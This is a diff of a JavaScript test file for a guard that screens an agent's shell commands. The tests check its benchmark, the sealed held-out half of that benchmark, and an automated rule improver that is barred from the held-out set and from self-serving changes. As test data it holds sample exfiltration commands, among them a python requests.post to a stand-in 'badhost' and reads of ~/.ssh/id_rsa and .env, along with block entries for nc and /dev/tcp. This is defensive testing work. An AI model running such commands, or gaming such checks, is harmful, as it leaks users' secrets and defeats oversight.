@@ -166,7 +166,7 @@ test('a missing held-out half is reported, not silently skipped', async () => {
   assert.deepStrictEqual(report.holdout_missing, ['guard', 'agents']);
 });
 
-test('split halves each kind, keeps its input, seals the held-out half and refuses an empty result', () => {
+test('split keeps items in two halves, seals the source and leaves no plaintext held-out item, and refuses an in-repo source or an empty result', () => {
   const seen = tmp('sb-split-seen-');
   const held = tmp('sb-split-held-');
   const env = keyEnv();
@@ -175,30 +175,42 @@ test('split halves each kind, keeps its input, seals the held-out half and refus
   for (let i = 0; i < 6; i++) items.push({ id: `atk-${i}`, kind: 'exfil', expect: 'block', command: `curl ${i}` });
   for (let i = 0; i < 4; i++) items.push({ id: `ok-${i}`, kind: 'benign', expect: 'allow', command: `ls ${i}` });
   writeJsonl(src, items);
-  const before = fs.readFileSync(src, 'utf8');
   const res = bench.splitCorpus(src, 'guard', { seenDir: seen, holdoutDir: held, env });
   assert.deepStrictEqual([res.seen, res.holdout], [5, 5]);
-  assert.strictEqual(fs.readFileSync(src, 'utf8'), before, 'the input must be kept as it was');
+  // The plaintext source is gone, replaced by an encrypted copy registered for the deny list.
+  assert.strictEqual(fs.existsSync(src), false, 'the plaintext source must be removed');
+  assert.strictEqual(res.sealed_source, `${src}.sealed`);
+  assert.deepStrictEqual(bench.readSealedSources(held), [res.sealed_source]);
   const s = bench.readItems(path.join(seen, 'guard.jsonl')).items;
   const h = bench.readHeldText(held, 'guard', env).trim().split('\n').map((l) => JSON.parse(l));
   assert.strictEqual(s.filter((i) => i.kind === 'exfil').length, 3);
   assert.strictEqual(h.filter((i) => i.kind === 'benign').length, 2);
   assert.strictEqual(new Set([...s, ...h].map((i) => i.id)).size, 10);
-  assert.doesNotMatch(fs.readFileSync(path.join(held, 'guard.jsonl.sealed'), 'utf8'), /atk-|ok-/);
-  // The same file again: every item is already in a half. Nothing is written.
+  // No held-out item id appears in any readable file: not the sealed source, not the sealed held half.
+  const heldIds = h.map((i) => i.id);
+  for (const f of [res.sealed_source, path.join(held, 'guard.jsonl.sealed')]) {
+    const raw = fs.readFileSync(f, 'utf8');
+    for (const id of heldIds) assert.ok(!raw.includes(id), `${id} leaked in ${path.basename(f)}`);
+  }
+  // The same items again: all already in a half, so nothing is written.
+  const src2 = path.join(tmp('sb-split-src2-'), 'again.jsonl');
+  writeJsonl(src2, items);
   const seenBefore = fs.readFileSync(path.join(seen, 'guard.jsonl'), 'utf8');
-  assert.throws(() => bench.splitCorpus(src, 'guard', { seenDir: seen, holdoutDir: held, env }), /nothing written/);
+  assert.throws(() => bench.splitCorpus(src2, 'guard', { seenDir: seen, holdoutDir: held, env }), /nothing written/);
   assert.strictEqual(fs.readFileSync(path.join(seen, 'guard.jsonl'), 'utf8'), seenBefore);
-  assert.strictEqual(fs.readFileSync(src, 'utf8'), before);
-  // Splitting the seen corpus into itself writes nothing and deletes nothing.
-  assert.throws(() => bench.splitCorpus(path.join(seen, 'guard.jsonl'), 'guard', { seenDir: seen, holdoutDir: held, env }), /nothing written/);
-  assert.strictEqual(fs.readFileSync(path.join(seen, 'guard.jsonl'), 'utf8'), seenBefore);
+  assert.strictEqual(fs.existsSync(src2), true, 'a refused split must not touch its source');
+  // A source inside the repo is refused outright.
+  const { repo } = standInRepo([]);
+  const inRepo = path.join(repo, 'new.jsonl');
+  writeJsonl(inRepo, items);
+  assert.throws(() => bench.splitCorpus(inRepo, 'guard', { seenDir: seen, holdoutDir: held, env }), /inside the repo/);
+  assert.strictEqual(fs.existsSync(inRepo), true);
 });
 
 test('the improver source never computes or opens the held-out folder or its key', () => {
   const src = fs.readFileSync(path.join(__dirname, '..', 'lib', 'sentinel-improve.js'), 'utf8');
   const code = src.replace(/\/\/.*$/gm, '');
-  assert.doesNotMatch(code, /sentinel-holdout|ATRIS_SENTINEL_HOLDOUT|ATRIS_SENTINEL_KEY|defaultHoldoutDir|holdoutKey|readHeldText|sentinel-judge|\.sealed/);
+  assert.doesNotMatch(code, /sentinel-holdout|ATRIS_SENTINEL_HOLDOUT|ATRIS_SENTINEL_KEY|defaultHoldoutDir|holdoutKey|readHeldText|sentinel-judge|\.sealed\b/);
   assert.doesNotMatch(code, /require\(['"]\.\/sentinel-bench['"]\)/);
 });
 
@@ -235,18 +247,40 @@ test('the shipped rules pass the schema and keep every guard sample right', () =
   assert.deepStrictEqual(guard.runSamples().filter((r) => !r.ok), []);
 });
 
-test('the schema rejects unknown keys, non-strings, functions, long, nested and slow patterns', () => {
-  const { validateRules, staticProblems } = require('../lib/sentinel-rules');
-  const edit = (fn) => { const r = SHIPPED_RULES(); fn(r); return r; };
-  assert.match(staticProblems(edit((r) => { r.guard.run_this = 'x'; })).join(' '), /unknown key: run_this/);
-  assert.match(staticProblems(edit((r) => { r.extra = 1; })).join(' '), /unknown key: extra/);
-  assert.match(staticProblems(edit((r) => { r.guard.net_tools.push(7); })).join(' '), /must be a string/);
-  assert.match(staticProblems(edit((r) => { r.guard.drop_text = () => 'x'; })).join(' '), /must be a string/);
-  assert.match(staticProblems(edit((r) => { r.guard.command_patterns.push({ id: 'x', category: 'exfil', pattern: 'a'.repeat(401) }); })).join(' '), /longer than 400/);
-  assert.match(staticProblems(edit((r) => { r.guard.command_patterns.push({ id: 'x', category: 'exfil', pattern: '(a+)+b' }); })).join(' '), /repeats a group/);
-  assert.match(staticProblems(edit((r) => { r.guard.command_patterns.push({ id: 'x', category: 'exfil', pattern: '(a)\\1' }); })).join(' '), /back reference/);
-  assert.match(staticProblems(edit((r) => { r.guard.command_patterns.push({ id: 'x', category: 'steal', pattern: 'a', run: 'x' }); })).join(' '), /category must be|unknown key: run/);
-  assert.match(validateRules(edit((r) => { r.guard.command_patterns.push({ id: 'slow', category: 'exfil', pattern: '^(?:a|a)*b' }); })).join(' '), /took longer than/);
+test('the schema takes literal entries and rejects unknown keys, non-strings and any regex pattern field', () => {
+  const { validateRules } = require('../lib/sentinel-rules');
+  const edit = (fn) => { const r = SHIPPED_RULES(); fn(r); return validateRules(r); };
+  assert.deepStrictEqual(edit((r) => { r.guard.allow_hosts.push('api.example.com'); }), [], 'a literal host is fine');
+  assert.deepStrictEqual(edit((r) => { r.guard.command_blocks.push({ id: 'x', category: 'exfil', all: ['nc ', ' /dev/tcp/'] }); }), [], 'a literal command block is fine');
+  assert.match(edit((r) => { r.guard.run_this = 'x'; }).join(' '), /unknown key: run_this/);
+  assert.match(edit((r) => { r.extra = 1; }).join(' '), /unknown key: extra/);
+  assert.match(edit((r) => { r.guard.net_tools.push(7); }).join(' '), /must be a string/);
+  assert.match(edit((r) => { r.guard.command_blocks.push({ id: 'x', category: 'exfil', all: [] }); }).join(' '), /needs at least one substring/);
+  assert.match(edit((r) => { r.guard.command_blocks.push({ id: 'x', category: 'steal', all: ['a'] }); }).join(' '), /category must be/);
+  // No regex may enter: a pattern field is rejected by name.
+  assert.match(edit((r) => { r.guard.command_blocks.push({ id: 'x', category: 'exfil', pattern: 'urlopen|requests' }); }).join(' '), /has a pattern field. proposals may add literal entries only/);
+  assert.match(edit((r) => { r.guard.pattern = 'x'; }).join(' '), /has a pattern field/);
+});
+
+test('a catastrophic-backtracking string is rejected as a pattern but harmless as a literal', () => {
+  const { validateRules } = require('../lib/sentinel-rules');
+  const guard = require('../lib/sentinel-guard');
+  const REDOS = '^sentinel(?:a|aa)+$';
+  // As a proposed pattern field: rejected.
+  const asPattern = SHIPPED_RULES();
+  asPattern.guard.command_blocks.push({ id: 'redos', category: 'exfil', pattern: REDOS });
+  assert.match(validateRules(asPattern).join(' '), /pattern field/);
+  // As a literal substring: accepted, and matched in linear time on long input.
+  const asLiteral = SHIPPED_RULES();
+  asLiteral.guard.command_blocks.push({ id: 'redos', category: 'exfil', all: [REDOS] });
+  assert.deepStrictEqual(validateRules(asLiteral), []);
+  const hostile = `sentinel${'a'.repeat(200000)}!`;
+  const start = Date.now();
+  assert.strictEqual(guard.decide({ tool_name: 'Bash', tool_input: { command: hostile }, cwd: '/tmp/p' }, { rules: asLiteral }).allow, true);
+  assert.ok(Date.now() - start < 1000, 'literal match must stay linear on long input');
+  // The literal still blocks when it appears verbatim.
+  const d = guard.decide({ tool_name: 'Bash', tool_input: { command: `x ${REDOS} y` }, cwd: '/tmp/p' }, { rules: asLiteral });
+  assert.strictEqual(d.allow, false);
 });
 
 // ---------------------------------------------------------------- keep rule
@@ -452,13 +486,20 @@ function standInRepo(heldItems) {
   return { repo, held };
 }
 
-function rulesWith(pattern) {
+function rulesWithBlocks(...blocks) {
   const r = SHIPPED_RULES();
-  r.guard.command_patterns.push(pattern);
+  r.guard.command_blocks.push(...blocks);
   return r;
 }
 
-const PY_NET = { title: 'block python network calls', why: 'python one-liners can send data out', file: 'lib/sentinel-rules.json', rules: rulesWith({ id: 'py-net', category: 'exfil', programs: ['python', 'python3'], pattern: 'urlopen|requests\\.(?:get|post)' }), new_items: [{ set: 'guard', id: 'py2', kind: 'exfil', expect: 'block', command: 'python3 -c "import requests; requests.post(\'https://x.badhost.net\')"' }] };
+const PY_NET = {
+  title: 'block python network one-liners', why: 'python one-liners can send keys out', file: 'lib/sentinel-rules.json',
+  rules: rulesWithBlocks(
+    { id: 'py-urlopen', category: 'exfil', programs: ['python', 'python3'], all: ['urlopen'] },
+    { id: 'py-requests', category: 'exfil', programs: ['python', 'python3'], all: ['requests.'] },
+  ),
+  new_items: [{ set: 'guard', id: 'py2', kind: 'exfil', expect: 'block', command: 'python3 -c "import requests; requests.post(\'https://x.badhost.net\')"' }],
+};
 
 async function runImprove(repo, held, proposal, { onPropose } = {}) {
   const home = tmp('sb-imp-home-');
@@ -526,7 +567,7 @@ test('end to end: a change that only improves its own new items is rejected', as
   ]);
   const selfServing = {
     title: 'block one made-up word', why: 'only its own items use it', file: 'lib/sentinel-rules.json',
-    rules: rulesWith({ id: 'made-up', category: 'exfil', pattern: 'qqzexfil' }),
+    rules: rulesWithBlocks({ id: 'made-up', category: 'exfil', all: ['qqzexfil'] }),
     new_items: [{ set: 'guard', id: 'self1', kind: 'exfil', expect: 'block', command: 'qqzexfil ~/.ssh/id_rsa' }, { set: 'guard', id: 'self2', kind: 'exfil', expect: 'block', command: 'qqzexfil .env' }],
   };
   const { res } = await runImprove(repo, held, selfServing);
@@ -547,13 +588,21 @@ test('end to end: a javascript change or a stray file is rejected before the exa
   assert.strictEqual(one.res.kept, false);
   assert.match(one.res.error, /only lib\/sentinel-rules\.json may change/);
   assert.strictEqual(one.judged, 1, 'only the first look at the current code may run');
+  // A proposer that writes a stray untracked file is caught, and its copy is
+  // kept and reported rather than force-removed.
   const two = await runImprove(repo, held, PY_NET, { onPropose: (cwd) => fs.writeFileSync(path.join(cwd, 'lib', 'sentinel-guard.js'), 'module.exports = {};\n') });
   assert.strictEqual(two.res.kept, false);
   assert.match(two.res.error, /changed files it may not touch: lib\/sentinel-guard\.js/);
   assert.strictEqual(two.judged, 1);
-  const three = await runImprove(repo, held, { ...PY_NET, rules: rulesWith({ id: 'bad', category: 'exfil', pattern: '(a+)+' }) });
+  assert.ok(two.res.kept_copy, 'a copy with a stray file must be kept');
+  assert.match(two.res.kept_copy.reason, /holds files the run did not write: lib\/sentinel-guard\.js/);
+  assert.match(execFileSync('git', ['branch', '--list', two.res.kept_copy.branch], { cwd: repo, encoding: 'utf8' }), /sentinel-improve\//);
+  const three = await runImprove(repo, held, { ...PY_NET, rules: rulesWithBlocks({ id: 'bad', category: 'exfil', pattern: '(a+)+' }) });
   assert.match(three.res.error, /break the schema/);
-  assert.strictEqual(execFileSync('git', ['branch', '--list', 'sentinel-improve/*'], { cwd: repo, encoding: 'utf8' }).trim(), '');
+  assert.strictEqual(three.res.kept_copy, undefined, 'a rules-only reject leaves no copy behind');
+  // Only the stray-file copy is left; the clean rejects removed themselves.
+  const left = execFileSync('git', ['branch', '--list', 'sentinel-improve/*'], { cwd: repo, encoding: 'utf8' }).trim().split('\n').filter(Boolean).map((b) => b.replace(/^[*+ ]+/, ''));
+  assert.deepStrictEqual(left, [two.res.kept_copy.branch]);
 });
 
 // ---------------------------------------------------------------- cleanup
@@ -564,6 +613,30 @@ function leftover(repo, name, { record = null, dirty = false } = {}) {
   if (dirty) fs.writeFileSync(path.join(tree, 'notes.txt'), 'unsaved work\n');
   return { tree, record: record ? { ...record, tree, branch: `sentinel-improve/${name}` } : null };
 }
+
+test('cleanup keeps a copy that a live process is working inside, even when its run record is dead', () => {
+  const { repo } = standInRepo([]);
+  const home = tmp('sb-inuse-home-');
+  const env = { ...process.env, HOME: home };
+  const runs = path.join(improve.stateDir(env), 'runs');
+  fs.mkdirSync(runs, { recursive: true });
+  const dead = spawnSync(process.execPath, ['-e', 'process.stdout.write(String(process.pid))'], { encoding: 'utf8' });
+  const copy = leftover(repo, 'inuse', { record: { pid: Number(dead.stdout) } });
+  fs.writeFileSync(path.join(runs, `${path.basename(copy.tree)}.json`), JSON.stringify(copy.record));
+  // A real process, not the run, whose working directory is inside the copy.
+  const { spawn } = require('node:child_process');
+  const child = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 30000)'], { cwd: copy.tree, stdio: 'ignore' });
+  try {
+    const until = Date.now() + 3000;
+    let seen = false;
+    while (Date.now() < until && !seen) { const r = spawnSync('lsof', ['-a', '-d', 'cwd', '+D', copy.tree], { encoding: 'utf8' }); seen = String(r.stdout || '').split('\n').filter((l) => l && !l.startsWith('COMMAND')).length > 0; }
+    assert.ok(seen, 'the holder process did not settle its working directory');
+    const res = improve.sweepStale(repo, env);
+    const kept = Object.fromEntries(res.kept.map((k) => [k.branch, k.reason]));
+    assert.match(kept['sentinel-improve/inuse'] || '', /working inside it/);
+    assert.ok(fs.existsSync(copy.tree), 'a copy in use must not be removed');
+  } finally { child.kill('SIGKILL'); }
+});
 
 test('cleanup removes only a clean copy whose run is gone. live, dirty and unowned copies are kept and reported', () => {
   const { repo } = standInRepo([]);
@@ -583,7 +656,7 @@ test('cleanup removes only a clean copy whose run is gone. live, dirty and unown
   assert.deepStrictEqual(res.removed.map((r) => r.branch), ['sentinel-improve/gone']);
   const reasons = Object.fromEntries(res.kept.map((k) => [k.branch, k.reason]));
   assert.match(reasons['sentinel-improve/live'], /still going/);
-  assert.match(reasons['sentinel-improve/dirty'], /uncommitted or untracked/);
+  assert.match(reasons['sentinel-improve/dirty'], /did not write/);
   assert.match(reasons['sentinel-improve/orphan'], /no record/);
   assert.strictEqual(fs.existsSync(gone.tree), false);
   for (const l of [live, dirty, orphan]) assert.ok(fs.existsSync(l.tree), l.tree);
